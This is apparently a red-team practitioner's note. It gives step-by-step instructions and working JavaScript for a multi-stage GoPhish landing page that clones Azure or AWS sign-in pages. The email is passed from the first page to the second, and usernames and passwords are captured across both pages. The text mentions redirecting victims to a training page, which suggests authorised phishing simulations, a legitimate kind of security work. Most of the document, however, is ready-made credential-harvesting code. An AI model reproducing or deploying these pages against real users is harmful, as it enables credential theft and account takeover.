---
creation date: October 10th 2024
last modified date: October 10th 2024
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[Multi-Stage Landing Page]]  
___

## Description:  

Instructions for using a multi-stage landing page in a GoPhish campaign. This was created to support cloud service pretexts like AWS and Azure where username and password are submitted on two separate pages. Example: [https://portal.azure.com](https://portal.azure.com)

Implementation Steps

1. Clone the username page and add it as the landing page in GoPhish.
2. Make sure form submissions are captured for this page, including passwords, and confirm that this is working correctly before adding the second page.
3. In GoPhish, set this landing page to redirect to the training page (or wherever you want victims to finally end up).
4. Clone the password page and save it as a static local page in /opt/gophish/static/endpoint/.
5. Edit the content of the username page and add an onsubmit attribute for the form. See the example forwardInfo JavaScript function below.

	1. Set the appropriate <SECOND_PAGE_URL> in the JavaScript function
	2. This will look something like: [https://example.com/static/second_page.html](https://example.com/static/second_page.html)
	3. On the "email = " line, the "email" in "form.email.value" is the name of the HTML form input. Make sure the input is named "email" or that the code matches here.

6. Edit the content of the password page and add a script at the bottom of the HTML body that executes a function on window load. See the handleParams JavaScript example below.

	1. On the "document.passwordForm.action" line near the end of the script, "passwordForm" has to match the actual form name on the page.
	2. If the email/username is incorporated into this second page anywhere, find that element's HTML ID, then uncomment the middle section of code and specify the element to overwrite.

Page 1 (Username Page) Code

|   |
|---|
|`<script>`<br><br>`function forwardInfo(form)`<br><br>`{`<br><br>  `secondPageURL = '<SECOND_PAGE_URL>'`<br><br>  `email         = encodeURIComponent(form.email.value);`<br><br>  `redirect_url  = encodeURIComponent(window.location.href);`<br><br>  `form.action   = secondPageURL + '?email=' + email + '&redirect_url=' + redirect_url;`<br><br>  `return true;`<br><br>`}`<br><br>`</script>`<br><br>`<form name="foo" ... onsubmit="return forwardInfo(this)">`|

Page 2 (Password Page) Code

|                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `<form name="passwordForm" ...`<br><br>`...`<br><br>`<script>`<br><br>`window.onload = handleParams;`<br><br>`function handleParams()`<br><br>`{`<br><br>  `// Parse parameters from URL`<br><br>  `queryString  = window.location.search;`<br><br>  `urlParams    = new URLSearchParams(queryString);`<br><br>  `email        = decodeURIComponent(urlParams.get('email'));`<br><br>  `redirect_url = decodeURIComponent(urlParams.get('redirect_url'));`<br><br>  `// Write the email address into the page if desired`<br><br>  `//document.getElementById("<HTML_ID>").innerHTML = email;`<br><br>  `// Submit the username to the first page`<br><br>  `var http = new XMLHttpRequest();`<br><br>  `http.open('POST', redirect_url);`<br><br>  `http.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded')`<br><br>  `http.send('email=' + email);`<br><br>  `// Set the form on this page to submit to the first page`<br><br>  `document.passwordForm.action = redirect_url;`<br><br>`}`<br><br>`</script>`<br><br>`</body>`<br><br>`</html>` |


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: October 10th 2024 (10:18 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
